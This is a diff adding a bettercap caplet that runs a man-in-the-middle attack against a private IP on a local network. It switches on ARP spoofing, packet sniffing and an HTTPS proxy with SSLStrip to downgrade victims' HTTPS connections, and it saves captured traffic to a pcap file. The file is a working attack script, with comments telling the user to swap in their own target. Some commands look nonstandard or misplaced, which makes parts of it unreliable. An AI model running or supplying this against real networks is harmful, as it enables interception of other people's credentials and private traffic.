@@ -1,0 +1,21 @@
+# Set the target IP address (replace with your target IP)
+set arp.spoof.targets 192.168.52.129
+
+# Enable ARP Spoofing to position yourself as the MITM
+arp.spoof on
+
+# Enable Network Sniffer to capture traffic
+net.sniff on
+
+# Enable HTTPS Proxy with SSLStrip to try downgrading HTTPS to HTTP
+https.proxy on
+set https.proxy.sslstrip true
+
+# Log the traffic (optional, replace with your desired path)
+set net.sniff.output /root/bettercap_capture.pcap
+
+# Start the HTTPS proxy and wait for connections
+https.proxy.start
+
+# Show the traffic being captured (optional)
+events.stream on
